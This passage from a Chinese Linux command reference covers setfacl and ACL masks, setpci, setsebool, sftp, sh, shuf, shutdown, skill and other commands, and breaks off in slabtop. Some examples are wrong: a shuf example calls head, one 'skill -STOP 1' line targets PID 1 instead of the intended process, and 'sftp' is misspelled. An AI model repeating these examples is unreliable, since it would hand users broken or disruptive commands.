任何一条包含指定的用户名或群组名的规则必须包含有效的权限组合。\n*   任何一条包含缺省规则的规则在使用时，缺省规则必须存在。\n\n **ACL的名词定义** \n\n先来看看在ACL里面每一个名词的定义，这些名词我大多从man page上摘下来虽然有些枯燥,但是对于理解下面的内容还是很有帮助的。\n\nACL是由一系列的Access Entry所组成的，每一条Access Entry定义了特定的类别可以对文件拥有的操作权限。Access Entry有三个组成部分：Entry tag type, qualifier (optional), permission。\n\n我们先来看一下最重要的Entry tag type，它有以下几个类型：\n\n```shell\nACL_USER_OBJ：相当于Linux里file_owner的permission\nACL_USER：定义了额外的用户可以对此文件拥有的permission\nACL_GROUP_OBJ：相当于Linux里group的permission\nACL_GROUP：定义了额外的组可以对此文件拥有的permission\nACL_MASK：定义了ACL_USER, ACL_GROUP_OBJ和ACL_GROUP的最大权限 (这个我下面还会专门讨论)\nACL_OTHER：相当于Linux里other的permission\n```\n\n让我们来据个例子说明一下，下面我们就用getfacl命令来查看一个定义好了的ACL文件：\n\n```shell\n[root@localhost ~]# getfacl ./test.txt\n# file: test.txt\n# owner: root\n# group: admin\nuser::rw-\nuser:john:rw-\ngroup::rw-\ngroup:dev:r--\nmask::rw- other::r--\n```\n\n前面三个以#开头的定义了文件名，file owner和group。这些信息没有太大的作用，接下来我们可以用`--omit-header`来省略掉。\n\n```shell\nuser::rw-       定义了ACL_USER_OBJ, 说明file owner拥有read and write permission\nuser:john:rw-   定义了ACL_USER,这样用户john就拥有了对文件的读写权限,实现了我们一开始要达到的目的\ngroup::rw-      定义了ACL_GROUP_OBJ,说明文件的group拥有read and write permission\ngroup:dev:r--   定义了ACL_GROUP,使得dev组拥有了对文件的read permission\nmask::rw-       定义了ACL_MASK的权限为read and write\nother::r--      定义了ACL_OTHER的权限为read\n```\n\n从这里我们就可以看出ACL提供了我们可以定义特定用户和用户组的功能，那么接下来我们就来看一下如何设置一个文件的ACL：\n\n **如何设置ACL文件** \n\n首先我们还是要讲一下设置ACL文件的格式，从上面的例子中我们可以看到每一个Access Entry都是由三个被：号分隔开的字段所组成，第一个就是Entry tag type。\n\n```shell\nuser   对应了ACL_USER_OBJ和ACL_USER\ngroup  对应了ACL_GROUP_OBJ和ACL_GROUP\nmask   对应了ACL_MASK\nother  对应了ACL_OTHER\n```\n\n第二个字段称之为qualifier，也就是上面例子中的john和dev组，它定义了特定用户和拥护组对于文件的权限。这里我们也可以发现只有user和group才有qualifier，其他的都为空。第三个字段就是我们熟悉的permission了。它和Linux的permission一样定义，这里就不多讲了。\n\n下面我们就来看一下怎么设置test.txt这个文件的ACL让它来达到我们上面的要求。\n\n一开始文件没有ACL的额外属性：\n\n```shell\n[root@localhost ~]# ls -l\n-rw-rw-r-- 1 root admin 0 Jul 3 22:06 test.txt\n\n[root@localhost ~]# getfacl --omit-header ./test.txt\nuser::rw- group::rw- other::r--\n```\n\n我们先让用户john拥有对test.txt文件的读写权限：\n\n```shell\n[root@localhost ~]# setfacl -m user:john:rw- ./test.txt\n[root@localhost ~]# getfacl --omit-header ./test.txt\nuser::rw-\nuser:john:rw-\ngroup::rw-\nmask::rw-\nother::r--\n```\n\n这时我们就可以看到john用户在ACL里面已经拥有了对文件的读写权。这个时候如果我们查看一下linux的permission我们还会发现一个不一样的地方。\n\n```shell\n[root@localhost ~]# ls -l ./test.txt\n-rw-rw-r--+ 1 root admin 0 Jul 3 22:06 ./test.txt\n```\n\n在文件permission的最后多了一个+号，当任何一个文件拥有了ACL_USER或者ACL_GROUP的值以后我们就可以称它为ACL文件，这个+号就是用来提示我们的。我们还可以发现当一个文件拥有了`ACL_USER`或者`ACL_GROUP`的值时`ACL_MASK`同时也会被定义。\n\n接下来我们来设置dev组拥有read permission：\n\n```shell\n[root@localhost ~]# setfacl -m group:dev:r-- ./test.txt\n[root@localhost ~]# getfacl --omit-header ./test.txt\nuser::rw-\nuser:john:rw-\ngroup::rw-\ngroup:dev:r--\nmask::rw-\nother::r--\n```\n\n到这里就完成了我们上面讲到的要求，是不是很简单呢。\n\n **ACL_MASK和Effective permission** \n\n这里需要重点讲一下`ACL_MASK`，因为这是掌握ACL的另一个关键，在Linux file permission里面大家都知道比如对于`rw-rw-r--`来说, 当中的那个`rw-`是指文件组的permission. 但是在ACL里面这种情况只是在`ACL_MASK`不存在的情况下成立。如果文件有ACL_MASK值，那么当中那个`rw-`代表的就是mask值而不再是group permission了。\n\n让我们来看下面这个例子：\n\n```shell\n[root@localhost ~]# ls -l\n-rwxrw-r-- 1 root admin 0 Jul 3 23:10 test.sh\n```\n\n这里说明test.sh文件只有file owner: root拥有read, write, execute/search permission。admin组只有read and write permission，现在我们想让用户john也对test.sh具有和root一样的permission。\n\n```shell\n[root@localhost ~]# setfacl -m user:john:rwx ./test.sh\n[root@localhost ~]# getfacl --omit-header ./test.sh\nuser::rwx user:john:rwx\ngroup::rw-\nmask::rwx\nother::r--\n```\n\n这里我们看到john已经拥有了rwx的permission，mask值也被设定为rwx，那是因为它规定了`ACL_USER`，`ACL_GROUP`和`ACL_GROUP_OBJ`的最大值，现在我们再来看test.sh的Linux permission，它已经变成了：\n\n```shell\n[root@localhost ~]# ls -l\n-rwxrwxr--+ 1 root admin 0 Jul 3 23:10 test.sh\n```\n\n那么如果现在admin组的用户想要执行test.sh的程序会发生什么情况呢？它会被permission deny。原因在于实际上admin组的用户只有read and write permission，这里当中显示的rwx是`ACL_MASK`的值而不是group的permission。\n\n所以从这里我们就可以知道，如果一个文件后面有+标记，我们都需要用getfacl来确认它的permission，以免发生混淆。\n\n下面我们再来继续看一个例子，假如现在我们设置test.sh的mask为read only，那么admin组的用户还会有write permission吗？\n\n```shell\n[root@localhost ~]# setfacl -m mask::r-- ./test.sh\n[root@localhost ~]# getfacl --omit-header ./test.sh\nuser::rwx\nuser:john:rwx   #effective:r--\ngroup::rw-      #effective:r--\nmask::r--\nother::r--\n```\n\n这时候我们可以看到ACL_USER和ACL_GROUP_OBJ旁边多了个#effective:r--，这是什么意思呢？让我们再来回顾一下`ACL_MASK`的定义。它规定了`ACL_USER`，`ACL_GROUP_OBJ`和`ACL_GROUP`的最大权限。那么在我们这个例子中他们的最大权限也就是read only。虽然我们这里给`ACL_USER`和`ACL_GROUP_OBJ`设置了其他权限，但是他们真正有效果的只有read权限。\n\n这时我们再来查看test.sh的Linux file permission时它的group permission也会显示其mask的值(i.e. r--)\n\n```shell\n[root@localhost ~]# ls -l\n-rwxr--r--+ 1 root admin 0 Jul 3 23:10 test.sh\n```\n\n **Default ACL** \n\n上面我们所有讲的都是Access ACL，也就是对文件而言。下面我简单讲一下Default ACL。Default ACL是指对于一个目录进行Default ACL设置，并且在此目录下建立的文件都将继承此目录的ACL。\n\n同样我们来做一个试验说明，比如现在root用户建立了一个dir目录：\n\n```shell\n[root@localhost ~]# mkdir dir\n```\n\n他希望所有在此目录下建立的文件都可以被john用户所访问，那么我们就应该对dir目录设置Default ACL。\n\n```shell\n[root@localhost ~]# setfacl -d -m user:john:rw ./dir\n[root@localhost ~]# getfacl --omit-header ./dir\nuser::rwx\ngroup::rwx\nother::r-x\ndefault:user::rwx\ndefault:user:john:rwx\ndefault:group::rwx\ndefault:mask::rwx\ndefault: other::r-x\n```\n\n这里我们可以看到ACL定义了default选项，john用户拥有了default的read, write, excute/search permission。所有没有定义的default都将从file permission里copy过来，现在root用户在dir下建立一个test.txt文件。\n\n```shell\n[root@localhost ~]# touch ./dir/test.txt\n[root@localhost ~]# ls -l ./dir/test.txt\n-rw-rw-r--+ 1 root root 0 Jul 3 23:46 ./dir/test.txt\n\n[root@localhost ~]# getfacl --omit-header ./dir/test.txt\nuser::rw-\nuser:john:rw-\ngroup::rwx #effective:rw-\nmask::rw-\nother::r--\n```\n\n这里我们看到在dir下建立的文件john用户自动就有了read and write permission，\n\n **ACL相关命令** \n\n前面的例子中我们都注意到了getfacl命令是用来读取文件的ACL，setfacl是用来设定文件的Acess ACL。这里还有一个chacl是用来改变文件和目录的Access ACL and Default ACL，它的具体参数大家可以去看man page。我只想提及一下`chacl -B`。它可以彻底删除文件或者目录的ACL属性(包括Default ACL)，比如你即使用了`setfacl -x`删除了所有文件的ACL属性，那个+号还是会出现在文件的末尾，所以正确的删除方法应该是用`chacl -B`用cp来复制文件的时候我们现在可以加上`-p`选项。这样在拷贝文件的时候也将拷贝文件的ACL属性，对于不能拷贝的ACL属性将给出警告。\n\nmv命令将会默认地移动文件的ACL属性，同样如果操作不允许的情况下会给出警告。\n\n **需要注意的几点** \n\n如果你的文件系统不支持ACL的话，你也许需要重新mount你的file system：\n\n```shell\nmount -o remount, acl [mount point]\n```\n\n如果用chmod命令改变Linux file permission的时候相应的ACL值也会改变，反之改变ACL的值，相应的file permission也会改变。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","setfacl"]},{"title":"【Linux 命令】setpci","url":"/linux-command/setpci/","content":"\n查询和配置PCI设备的使用工具\n\n## 补充说明\n\n**setpci命令** 是一个查询和配置PCI设备的使用工具。\n\n###  语法\n\n```shell\nsetpci(选项)(参数)\n```\n\n###  选项\n\n```shell\n-v：显示指令执行的细节信息；\n-f：当没有任何操作需要完成时，不显示任何信息；\n-D：测试模式，并不真正将配置信息写入寄存器；\n-d：仅显示给定厂商和设备的信息；\n-s：仅显示指定总线、插槽上的设备或设备上的功能块信息。\n```\n\n###  参数\n\n*   PCI设备：指定要配置的PCI设备；\n*   操作：指定要完成的配置操作。\n\n###  实例\n\nLinux下调节笔记本屏幕亮度方法：\n\n首先进入终端输入lspci命令，列出各种设备的地址：\n\n```shell\nlspci\n00:00.0 host bridge: Intel Corporation Mobile 945GM/PM/GMS, 943/940GML and 945GT Express Memory Controller Hub (rev 03)\n00:02.0 VGA compatible controller: Intel Corporation Mobile 945GM/GMS, 943/940GML Express Integrated Graphics Controller (rev 03)\n00:02.1 Display controller: Intel Corporation Mobile 945GM/GMS/GME, 943/940GML Express Integrated Graphics Controller (rev 03)\n00:1b.0 Audio device: Intel Corporation N10/ICH 7 Family High Definition Audio Controller (rev 02)\n00:1c.0 PCI bridge: Intel Corporation N10/ICH 7 Family PCI Express Port 1 (rev 02)\n00:1c.1 PCI bridge: Intel Corporation N10/ICH 7 Family PCI Express Port 2 (rev 02)\n......\n```\n\n发现00:02.0是VGA设备，于是我们修改它的属性：\n\n```shell\nsudo setpci -s 00:02.0 F4.B=FF\n```\n\n解释一下：\n\n*    **setpci**  是修改设备属性的命令。\n*    **-s**  表示接下来输入的是设备的地址。\n*    **00:02.0**  VGA设备地址（<总线>:<接口>.<功能>）。\n*    **F4**  要修改的属性的地址，这里应该表示“亮度”。\n*    **.B**  修改的长度（B应该是字节（Byte），还有w（应该是Word，两个字节）、L（应该是Long，4个字节））。\n*    **=FF**  要修改的值（可以改）。\n\n我这里00是最暗，FF是最亮，不同的电脑可能不一样。比如说我嫌FF太闪眼了，我就可以：\n\n```shell\nsudo setpci -s 00:02.0 F4.B=CC\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","setpci"]},{"title":"【Linux 命令】setsebool","url":"/linux-command/setsebool/","content":"\n修改SElinux策略内各项规则的布尔值\n\n## 补充说明\n\n**setsebool命令** 是用来修改SElinux策略内各项规则的布尔值。setsebool命令和getsebool命令是SELinux修改和查询布尔值的一套工具组。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。\n\n###  语法\n\n```shell\nsetsebool [-P] 布尔值=[0|1]\n```\n\n###  选项\n\n```shell\n-P:直接将设置值写入配置文件，该设置数据将来会生效的。\n```\n\n###  实例\n\n允许vsftp匿名用户写入权限：\n\n```shell\nsetsebool -P allow_ftpd_anon_write=1\n```\n\n如果你希望你的ftp用户可以访问自己的家目录的话，需要开启：\n\n```shell\nsetsebool -P ftp_home_dir 1\n```\n\n如果你希望将vsftpd以daemon的方式运行的话，需要开启：\n\n```shell\nsetsebool -P ftpd_is_daemon 1\n```\n\n你可以让SElinux停止保护vsftpd的daemon方式动行：\n\n```shell\nsetsebool -P ftpd_disable_trans 1 \n```\n\nHTTP被设置允许cgi的设置：\n\n```shell\nsetsebool -P httpd_enable_cgi 1\n```\n\n允许用户HHTP访问其家目录，该设定限仅于用户的家目录主页：\n\n```shell\nsetsebool -P httpd_enable_homedirs 1\nchcon -R -t httpd_sys_content_t ~user/public_html\n```\n\n允许httpd访问终端：\n\n```shell\nsetsebool -P httpd_tty_comm 1\n```\n\n关闭Selinux的关于httpd进程守护的保护：\n\n```shell\nsetsebool -P httpd_disable_trans 1\nservice httpd restart\n```\n\n关于named、master更新selinux设定：\n\n```shell\nsetsebool -P named_write_master_zones 1\n```\n\n关闭named的进程守护保护：\n\n```shell\nsetsebool -P named_disable_trans 1\nservice named restart\n```\n\nSelinux将本机的NFS共享设置成只读：\n\n```shell\nsetsebool -P nfs_export_all_ro 1\n```\n\nSElinux将本机的NFS共享设置成可读可写：\n\n```shell\nsetsebool -P nfs_export_all_rw 1\n```\n\n如果你想要将远程NFS的家目录共享到本机，需要开启：\n\n```shell\nsetsebool -P use_nfs_home_dirs 1\n```\n\n如果samba服务器共享目录给多个域，则需要：\n\n```shell\nsetsebool -P allow_smbd_anon_write=1\n```\n\nsamba服务器要共享家目录时：\n\n```shell\nsetsebool -P samba_enable_home_dirs 1\n```\n\n如果你需在本机上使用远程samba服务器的家目录：\n\n```shell\nsetsebool -P use_samba_home_dirs 1\n```\n\n关闭selinux关于samba的进程守护的保护：\n\n```shell\nsetsebool -P smbd_disable_trans 1\nservice smb restart\n```\n\n允许rsync其他用户写入时：\n\n```shell\nsetsebool -P allow_rsync_anon_write=1\n```\n\n停止rsync的进程保护\n\n```shell\nsetsebool -P rsync_disable_trans 1\n```\n\n允许系统使用kerberos：\n\n```shell\nsetsebool -P allow_kerberos 1\n```\n\n系统工作在nis环境时：\n\n```shell\nsetsebool -P allow_ypbind 1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","setsebool"]},{"title":"【Linux 命令】setsid","url":"/linux-command/setsid/","content":"\n在新的会话中运行程序\n\n## 补充说明\n\n**setsid命令** 子进程从父进程继承了：SessionID、进程组ID和打开的终端。子进程如果要脱离这些，代码中可通过调用setsid来实现。，而命令行或脚本中可以通过使用命令setsid来运行程序实现。setsid帮助一个进程脱离从父进程继承而来的已打开的终端、隶属进程组和隶属的会话。\n\n###  语法\n\n```shell\nsetsid[options] <program> [arguments ...]\n```\n\n###  选项\n\n```shell\n-c, --ctty   将控制终端设置为当前控制终端\n-f, --fork   总是 fork\n-w, --wait   等待程序退出，并使用相同的返回\n```\n\n\n### 实例\n\n可见 setsid 的使用也是非常方便的，也只需在要处理的命令前加上 setsid 即可\n\n```shell\n[root@root ~]# setsid ping www.ibm.com\n[root@root ~]# ps -ef |grep www.ibm.com\nroot 31094 1 0 07:28 ? 00:00:00 ping www.ibm.com\nroot 31102 29217 0 07:29 pts/4 00:00:00 grep www.ibm.com\n[root@root ~]#\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","setsid"]},{"title":"【Linux 命令】sftp-server","url":"/linux-command/sftp-server/","content":"\nsftp协议的服务器端程序\n\n## 补充说明\n\n**sftp-server命令** 是一个“sftp”协议的服务器端程序，它使用加密的方式进行文件传输。\n\n###  语法\n\n```shell\nsftp-server\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sftp-server"]},{"title":"【Linux 命令】sftp","url":"/linux-command/sftp/","content":"\n交互式的文件传输程序\n\n## 补充说明\n\n**sftp命令** 是一款交互式的文件传输程序，命令的运行和使用方式与ftp命令相似，但是，sftp命令对传输的所有信息使用ssh加密，它还支持公钥认证和压缩等功能。\n\n###  语法\n\n```shell\nsftp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-B：指定传输文件时缓冲区的大小；\n-l：使用ssh协议版本1；\n-b：指定批处理文件；\n-C：使用压缩；\n-o：指定ssh选项；\n-F：指定ssh配置文件；\n-R：指定一次可以容忍多少请求数；\n-v：升高日志等级。\n```\n\n###  参数\n\n目标主机：指定sftp服务器ip地址或者主机名。\n\n###  实例\n\n建立联接\n\n```shell\n$ sfpt username@1.1.1.1 # 回车输入密码\n```\n\n获取文件下载到指定路径\n\n```shell\nsftp> get /export/sftp/test.csv /Users/my/Downloads\nFetching /export/sftp/test.csv to /Users/my/Downloads/test.csv\n/export/sftp/test.csv            100%  133     0.3KB/s   00:00\n```\n\n上传本地文件到服务器指定路径\n\n```shell\nsftp> put /Users/my/Downloads/re-produce.gif /export/sftp\nUploading /Users/my/Downloads/re-produce.gif to /export/sftp/re-produce.gif\n/Users/my/Downloads/re-produce.gif            100%  257KB  86.6KB/s   00:02\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sftp"]},{"title":"【Linux 命令】sh","url":"/linux-command/sh/","content":"\nshell命令解释器\n\n## 补充说明\n\n**sh命令** 是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。通过用户输入命令，和内核进行沟通！Bourne Again Shell （即bash）是自由软件基金会（GNU）开发的一个Shell，它是Linux系统中一个默认的Shell。Bash不但与Bourne Shell兼容，还继承了C Shell、Korn Shell等优点。\n\n###  语法\n\n```shell\nbash [options] [file]\n```\n\n###  选项\n\n```shell\n-c string：命令从-c后的字符串读取。\n-i：实现脚本交互。\n-n：进行shell脚本的语法检查。\n-x：实现shell脚本逐条语句的跟踪。\n```\n\n###  实例\n\n使用-x选项跟踪脚本调试shell脚本，能打印出所执行的每一行命令以及当前状态：\n\n```shell\n[root@AY1307311912260196fcZ satools]# sh -x check_ssh_login.sh\n+ DEFINE=30\n+ cat /var/log/secure\n+ awk '/Failed/ {++ip[$(NF-3)]} END {for (i in ip) print i\"=\"ip[i]}'\n++ cat /root/satools/black.txt\n+ for i in '`cat /root/satools/black.txt`'\n++ echo 121.42.0.16=1427\n++ awk -F= '{print $1}'\n+ IP=121.42.0.16\n++ echo 121.42.0.16=1427\n++ awk -F= '{print $2}'\n+ NUM=1427\n+ '[' 1427 -gt 30 ']'\n+ grep 121.42.0.16 /etc/hosts.deny\n+ '[' 1 -gt 0 ']'\n+ echo sshd:121.42.0.16\n+ echo vsftpd:121.42.0.16\n+ for i in '`cat /root/satools/black.txt`'\n++ echo 121.42.0.72=276\n++ awk -F= '{print $1}'\n+ IP=121.42.0.72\n++ awk -F= '{print $2}'\n++ echo 121.42.0.72=276\n+ NUM=276\n+ '[' 276 -gt 30 ']'\n+ grep 121.42.0.72 /etc/hosts.deny\n+ '[' 1 -gt 0 ']'\n+ echo sshd:121.42.0.72\n+ echo vsftpd:121.42.0.72\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sh"]},{"title":"【Linux 命令】shift","url":"/linux-command/shift/","content":"\n移动位置参数。\n\n## 概要\n\n```shell\nshift [n]\n```\n\n## 主要用途\n\n- 将位置参数`$n, $n+1...`重命名为`$1, $2...`。\n\n## 参数\n\nn（可选）：大于等于1且小于等于参数个数的整数，默认为1。\n\n## 返回值\n\n返回成功除非n大于参数个数或n小于1以及其他非法值。\n\n## 例子\n\n假设我们的脚本文件（test.sh）如下：\n\n```shell\n#!/usr/bin/env bash\n# 显示前三个位置参数。\necho \"$1 $2 $3\"\n# 移除前两个位置参数，并将$3重命名为$1，之后的以此类推。\nshift 2\necho \"$1 $2 $3\"\n```\n\n在终端执行该脚本：\n\n```shell\nsh test.sh q w e r t\n```\n\n返回信息如下：\n\n```shell\nq w e\ne r t\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","shift"]},{"title":"【Linux 命令】shopt","url":"/linux-command/shopt/","content":"\n显示和设置shell操作选项\n\n## 补充说明\n\n**shopt命令** 用于显示和设置shell中的行为选项，通过这些选项以增强shell易用性。shopt命令若不带任何参数选项，则可以显示所有可以设置的shell操作选项。\n\n###  语法\n\n```shell\nshopt(选项)(参数)\n```\n\n###  选项\n\n```shell\n-s：激活指定的shell行为选项；\n-u：关闭指定的shell行为选项。\n```\n\n###  参数\n\nshell选项：指定要操作的shell选项。\n\n###  实例\n\n使用shopt命令显示当前所有可以设置的shell操作选项，输入如下命令：\n\n```shell\nshopt           #输出所有可以设置的shell操作选项\ncdable_vars     off\ncdspell         off\ncheckhash       off\ncheckwinsize    on\ncmdhist         on\ndotglob         off\nexecfail        off\nexpand_aliases  on\nextdebug        off\n...\n```\n\n如图上所示，选项\"cdspell\"的状态为\"off\"，即关闭cd拼写检查选项。现在，可以使用shopt命令将其开启，输入如下命令：\n\n```shell\nshopt -s cdspell          #开启cd拼写检查\n```\n\n执行上面的命令后，该选项的状态将变为\"on\"，即开启状态。可以再次通过该命令显示一下shell操作选项即可，输出信息如下：\n\n```shell\ncdspell on                #开启cdspell选项\n```\n\n用户可以通过实际执行cd命令检查该选项是否被成功开启。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","shopt"]},{"title":"【Linux 命令】showmount","url":"/linux-command/showmount/","content":"\n显示NFS服务器加载的信息\n\n## 补充说明\n\n**showmount命令** 查询“mountd”守护进程，以显示NFS服务器加载的信息。\n\n###  语法\n\n```shell\nshowmount(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：仅显示已被NFS客户端加载的目录；\n-e：显示NFS服务器上所有的共享目录。\n```\n\n###  参数\n\nNFS服务器：指定NFS服务器的ip地址或者主机名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","showmount"]},{"title":"【Linux 命令】shuf","url":"/linux-command/shuf/","content":"\n产生随机的排列。\n\n## 概要\n\n```shell\nshuf [OPTION]... [FILE]\nshuf -e [OPTION]... [ARG]...\nshuf -i LO-HI [OPTION]...\n```\n\n## 主要用途\n\n- 将输入的内容随机排列并输出。\n- 当没有文件或文件为`-`时，读取标准输入。\n\n## 选项\n\n```shell\n-e, --echo                  将每个ARG视为输入行。\n-i, --input-range=LO-HI     将数字范围LO（最低）到HI（最高）之间的作为输入行。\n-n, --head-count=COUNT      只输出前COUNT行。\n-o, --output=FILE           将结果写入到文件而不是标准输出。\n    --random-source=FILE    将FILE中内容作为随机数据源。\n-r, --repeat                输出行可以重复。\n-z, --zero-terminated       行终止符为NUL（空字符）而不是默认的换行符。\n--help                      显示帮助信息并退出。\n--version                   显示版本信息并退出。\n```\n\n## 参数\n\nFILE（可选）：要处理的文件，可以为任意数量。\n\nARG（可选）：作为输入行的字符串，可以为任意数量。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\n# 模拟硬币抛掷，获取前10个结果：\n[user2@pc ~]$ head -r -n 10 -e \"正面\" -e \"反面\"\n反面\n正面\n正面\n正面\n反面\n反面\n反面\n正面\n正面\n正面\n```\n\n```shell\n[user2@pc ~]$ shuf -i 1-35 -n 5|sort -n && shuf -i 1-12 -n 2|sort -n\n4\n17\n20\n29\n31\n6\n11\n```\n\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，更多详细的帮助信息请查看`man -s 1 shuf`，`info coreutils 'shuf invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","shuf"]},{"title":"【Linux 命令】shutdown","url":"/linux-command/shutdown/","content":"\n用来执行系统关机的命令\n\n## 补充说明\n\n**shutdown命令** 用来系统关机命令。shutdown指令可以关闭所有程序，并依用户的需要，进行重新开机或关机的动作。\n\n###  语法\n\n```shell\nshutdown(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：当执行“shutdown -h 11:50”指令时，只要按+键就可以中断关机的指令；\n-f：重新启动时不执行fsck；\n-F：重新启动时执行fsck；\n-h：将系统关机；\n-k：只是送出信息给所有用户，但不会实际关机；\n-n：不调用init程序进行关机，而由shutdown自己进行；\n-r：shutdown之后重新启动；\n-t<秒数>：送出警告信息和删除信息之间要延迟多少秒。\n```\n\n###  参数\n\n*   [时间]：设置多久时间后执行shutdown指令；\n*   [警告信息]：要传送给所有登入用户的信息。\n\n###  实例\n\n指定现在立即关机：\n\n```shell\nshutdown -h now\n```\n\n指定5分钟后关机，同时送出警告信息给登入用户：\n\n```shell\nshutdown +5 \"System will shutdown after 5 minutes\"\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","shutdown"]},{"title":"【Linux 命令】skill","url":"/linux-command/skill/","content":"\n向选定的进程发送信号冻结进程\n\n## 补充说明\n\n**skill命令** 用于向选定的进程发送信号，冻结进程。这个命令初学者并不常用，深入之后牵涉到系统服务优化之后可能会用到。\n\n###  语法\n\n```shell\nskill(选项)\n```\n\n###  选项\n\n```shell\n-f：快速模式；\n-i：交互模式，每一步操作都需要确认；\n-v：冗余模式；\n-w：激活模式；\n-V：显示版本号；\n-t：指定开启进程的终端号；\n-u：指定开启进程的用户；\n-p：指定进程的id号；\n-c：指定开启进程的指令名称。\n```\n\n###  实例\n\n如果您发现了一个占用大量CPU和内存的进程，但又不想停止它，该怎么办？考虑下面的top命令输出：\n\n```shell\ntop -c -p 16514\n23:00:44  up 12 days,  2:04,  4 users,  load average: 0.47, 0.35, 0.31\n1 processes: 1 sleeping, 0 running, 0 zombie, 0 stopped\nCPU states:  cpu    user    nice  system    irq  softirq  iowait    idle\n           total    0.0%    0.6%    8.7%   2.2%     0.0%   88.3%    0.0%\nMem:  1026912k av, 1010476k used,   16436k free,       0k shrd,   52128k buff\n                    766724k actv,  143128k in_d,   14264k in_c\nSwap: 2041192k av,   83160k used, 1958032k free                  799432k cached\n\n  PID USER     PRI  NI  SIZE  RSS SHARE stat %CPU %MEM   time CPU command\n16514 oracle    19   4 28796  26M 20252 D N   7.0  2.5   0:03   0 oraclePRODB2...\n```\n\n既然您确认进程16514占用了大量内存，您就可以使用skill命令“冻结”它，而不是停止它。\n\n```shell\nskill -STOP 1\n```\n\n之后，检查top输出：\n\n```shell\n23:01:11  up 12 days,  2:05,  4 users,  load average: 1.20, 0.54, 0.38\n1 processes: 0 sleeping, 0 running, 0 zombie, 1 stopped\nCPU states:  cpu    user    nice  system    irq  softirq  iowait    idle\n           total    2.3%    0.0%    0.3%   0.0%     0.0%    2.3%   94.8%\nMem:  1026912k av, 1008756k used,   18156k free,       0k shrd,    3976k buff\n                    770024k actv,  143496k in_d,   12876k in_c\nSwap: 2041192k av,   83152k used, 1958040k free                  851200k cached\n\n  PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n16514 oracle    19   4 28796  26M 20252 T N   0.0  2.5   0:04   0 oraclePRODB2...\n```\n\n现在，CPU 从 0% 空闲变为 94% 空闲。该进程被有效冻结。过一段时间之后，您可能希望唤醒该进程：\n\n```shell\nskill -CONT 16514\n```\n\n如果希望暂时冻结进程以便为完成更重要的进程腾出空间，该方法非常有用。\n\n此命令用途很广。如果您要停止 \"oracle\" 用户的所有进程，只需要一个命令即可实现：\n\n```shell\nskill -STOP oracle\n```\n\n可以使用用户、PID、命令或终端 id 作为参数。以下命令可停止所有 rman 命令。\n\n```shell\nskill -STOP rman\n```\n\n如您所见，skill 决定您输入的参数（进程 ID、用户 ID 或命令）并进行相应操作。这可能会导致在某些情况下出现这样的问题：您可能具有同名的用户和命令。最好的示例是 \"oracle\" 进程，通常由用户 \"oracle\" 运行。因此，当您希望停止名为 \"oracle\" 的进程时，可执行以下命令：\n\n```shell\nskill -STOP oracle\n```\n\n用户 \"oracle\" 的所有进程都停止，包括您可能要使用的会话。要非常明确地执行命令，您可以选择使用一个新参数指定参数的类型。要停止一个名为 oracle 的命令，可执行以下命令：\n\n```shell\nskill -STOP -c oracle\n```\n\nsnice命令的功能与skill类似。但它用于降低进程的优先级，而不是停止进程。首先，检查 top 输出：\n\n```shell\n  PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n    3 root      15   0     0    0     0 RW    0.0  0.0   0:00   0 kapmd\n13680 oracle    15   0 11336  10M  8820 T     0.0  1.0   0:00   0 oracle\n13683 oracle    15   0  9972 9608  7788 T     0.0  0.9   0:00   0 oracle\n13686 oracle    15   0  9860 9496  7676 T     0.0  0.9   0:00   0 oracle\n13689 oracle    15   0 10004 9640  7820 T     0.0  0.9   0:00   0 oracle\n13695 oracle    15   0  9984 9620  7800 T     0.0  0.9   0:00   0 oracle\n13698 oracle    15   0 10064 9700  7884 T     0.0  0.9   0:00   0 oracle\n13701 oracle    15   0 22204  21M 16940 T     0.0  2.1   0:00   0 oracle\n```\n\n现在，将 \"oracle\" 进程的优先级降低四个点。注意，该值越高，优先级越低。\n\n```shell\nsnice +4 -u oracle\n  PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME CPU COMMAND\n16894 oracle    20   4 38904  32M 26248 D N   5.5  3.2   0:01   0 oracle\n```\n\n注意，NI 列（nice 值）现在是 4，优先级现在设置为 20，而不是 15。这对于降低优先级非常有帮助。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","skill"]},{"title":"【Linux 命令】slabtop","url":"/linux-command/slabtop/","content":"\n实时显示内核slab内存缓存信息\n\n## 补充说明\n\n**slabtop命令** 以实时的方式显示内核“slab”缓冲区的细节信息。\n\n###  语法\n\n```shell\nslabtop(选项)\n```\n\n###  选项\n\n```shell\n--delay=n, -d n：每n秒更新一次显示的信息，默认是每3秒；\n--sort=S, -s S：指定排序标准进行排序（排序标准，参照下面或者man手册）；\n--once, -o：显示一次后退出；\n--version, -V：显示版本；\n--help：显示帮助信息。\n```\n\n排序标准：\n\n*   a: sort by number of active objects\n*   b: sort by objects per slab\n*   c: sort by cache 